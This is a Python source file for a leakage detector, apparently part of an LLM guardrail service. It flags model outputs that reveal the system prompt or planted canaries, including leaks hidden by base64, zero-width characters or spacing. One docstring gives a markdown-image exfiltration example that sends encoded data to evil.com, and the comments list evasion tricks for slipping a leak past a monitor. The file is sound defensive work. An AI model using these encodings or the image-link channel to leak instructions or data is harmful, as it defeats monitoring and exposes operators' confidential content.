import base64
import binascii
import re
import time
import unicodedata

from app.detectors.base import Detector
from app.schemas import CheckResult, ScanRequest
from app.workers import BoundedWorkers

WORD = re.compile(r"[^\W_]+")  # "_" separates words too: snake_case must not hide a verbatim run
# Short enough for an 8-char canary (12 base64 chars); standard and URL-safe alphabets.
BASE64_TOKEN = re.compile(r"[A-Za-z0-9+/_-]{8,}={0,2}")
BASE64_LINE = re.compile(r"[A-Za-z0-9+/_-]+={0,2}")
# Any run of this many consecutive system-prompt words in the output is a leak, however long the system
# prompt is (the overlap ratio alone is diluted by long prompts).
MIN_VERBATIM_RUN = 8
# Below this, a "leak" is indistinguishable from coincidence ("You are helpful").
MIN_PROMPT_WORDS = 3


def normalize(text: str) -> str:
    """What a reader sees: compatibility forms folded (full-width letters -> ASCII) and invisible format
    characters (zero-width spaces/joiners, soft hyphens, bidi marks) removed, so they can't hide a leak."""
    folded = unicodedata.normalize("NFKC", text)
    return "".join(ch for ch in folded if unicodedata.category(ch) != "Cf").lower()


def _alnum(text: str) -> str:
    return "".join(ch for ch in text if ch.isalnum())


def _words(text: str) -> list[str]:
    return WORD.findall(normalize(text))


def _ngrams(words: list[str], n: int) -> set[tuple[str, ...]]:
    return {tuple(words[i : i + n]) for i in range(len(words) - n + 1)}


def _contains_run(haystack: list[str], needle: list[str]) -> bool:
    n = len(needle)
    return any(haystack[i : i + n] == needle for i in range(len(haystack) - n + 1))


def _wrapped_blobs(text: str) -> list[str]:
    """Base64 wrapped over several lines (MIME: 76 chars, PEM: 64): consecutive lines of equal length plus a
    shorter last one, joined back into one blob. Decoding line by line would cut words and canaries at every
    line break."""
    lines = [line.strip() for line in text.splitlines()]
    blobs, i = [], 0
    while i < len(lines):
        width = len(lines[i])
        if width >= 16 and width % 4 == 0 and BASE64_LINE.fullmatch(lines[i]):
            j = i + 1
            while j < len(lines) and len(lines[j]) == width and BASE64_LINE.fullmatch(lines[j]):
                j += 1
            if j < len(lines) and 0 < len(lines[j]) < width and BASE64_LINE.fullmatch(lines[j]):
                j += 1  # the shorter final line
            if j - i > 1:
                blobs.append("".join(lines[i:j]))
                i = j
                continue
        i += 1
    return blobs


def _b64decode(token: str) -> str | None:
    core = token.rstrip("=")
    padded = core + "=" * (-len(core) % 4)
    for altchars in (None, b"-_"):
        try:
            return base64.b64decode(padded, altchars=altchars, validate=True).decode("utf-8")
        except (binascii.Error, UnicodeDecodeError, ValueError):
            continue
    return None


def _candidates(token: str) -> list[str]:
    """A base64 token as found, its pieces between '/', '-', '_' (a URL path or identifier glued in front,
    e.g. ![](https://evil.com/x/<base64>)), and the other 3 alignments of long tokens."""
    pieces = [token] + [p for p in re.split(r"[/_-]", token) if len(p) >= 8]
    if len(token) >= 16:
        pieces += [token[offset:] for offset in (1, 2, 3)]
    return pieces


def decoded_views(text: str) -> list[str]:
    """The text, plus everything base64-decodable in it joined into one more view, so an encoded leak is
    compared too. Every token is decoded (no cap a flood of junk tokens could push the real one past), and
    the decoded text is at most ~1.5x the input, so the cost stays linear."""
    tokens = BASE64_TOKEN.findall(text) + _wrapped_blobs(text)
    decoded = [d for token in tokens for d in map(_b64decode, _candidates(token)) if d]
    return [text, "\n".join(decoded)] if decoded else [text]


class SystemPromptIndex:
    """The system prompt's words and n-gram sets, built once and compared against every view of an output."""

    def __init__(self, system_prompt: str, n: int) -> None:
        self.words = _words(system_prompt)
        self.n = n
        self.verbatim_grams = _ngrams(self.words, MIN_VERBATIM_RUN)
        self.grams = _ngrams(self.words, n)

    def leak(self, output: str) -> tuple[float, bool]:
        """(fraction of the system prompt's word n-grams found in the output, verbatim run found)."""
        if len(self.words) < MIN_PROMPT_WORDS:
            return 0.0, False
        out_words = _words(output)
        if len(self.words) < MIN_VERBATIM_RUN:  # short prompt: the whole prompt, word for word
            verbatim = _contains_run(out_words, self.words)
        else:
            verbatim = bool(self.verbatim_grams & _ngrams(out_words, MIN_VERBATIM_RUN))
        if len(self.words) < self.n:
            return (1.0 if verbatim else 0.0), verbatim
        return len(self.grams & _ngrams(out_words, self.n)) / len(self.grams), verbatim


def system_prompt_leak(system_prompt: str, output: str, n: int) -> tuple[float, bool]:
    return SystemPromptIndex(system_prompt, n).leak(output)


class LeakageDetector(Detector):
    """Detects a model response leaking the system prompt or planted canary tokens: verbatim runs, overall
    overlap, and the same inside base64. Paraphrased or translated leaks are not detected."""

    name = "leakage"

    def __init__(self, workers: int = 2) -> None:
        super().__init__()
        # n-gram matching over up to 200k chars is CPU work: off the event loop, and bounded like the models
        self.workers = BoundedWorkers("leakage", workers)

    async def check(self, req: ScanRequest) -> CheckResult:
        if req.direction != "output":
            return self.skipped("leakage applies to model outputs only")
        if not req.context.system_prompt and not req.context.canaries:
            return self.skipped("no system_prompt or canaries in context")
        return await self.workers.run(self._check, req, time.monotonic() + req.timeout_ms / 1000)

    def _check(self, req: ScanRequest, deadline: float) -> CheckResult:
        ctx, cfg = req.context, req.config.leakage
        views = decoded_views(req.text)
        # canaries compared on letters and digits only: "C A N A R Y", "canary_8f3a" and a zero-width space
        # between every character all still match
        squashed = [_alnum(normalize(v)) for v in views]
        keys = [_alnum(normalize(c)) for c in ctx.canaries]
        canary_hits = sum(1 for k in keys if k and any(k in v for v in squashed))
        overlap, verbatim = 0.0, False
        if ctx.system_prompt:
            index = SystemPromptIndex(ctx.system_prompt, cfg.ngram)
            for view in views:
                if time.monotonic() > deadline:
                    raise TimeoutError("deadline passed")  # the caller already gave up: free the worker
                o, v = index.leak(view)
                overlap, verbatim = max(overlap, o), verbatim or v
        leaked = canary_hits > 0 or verbatim
        return CheckResult(
            check=self.name,
            status="ok",
            flagged=leaked or overlap >= cfg.threshold,
            score=1.0 if leaked else round(overlap, 4),
            details={"canary_hits": canary_hits, "verbatim_run": verbatim, "system_prompt_overlap": round(overlap, 4),
                     "decoded_views": len(views) - 1},
        )
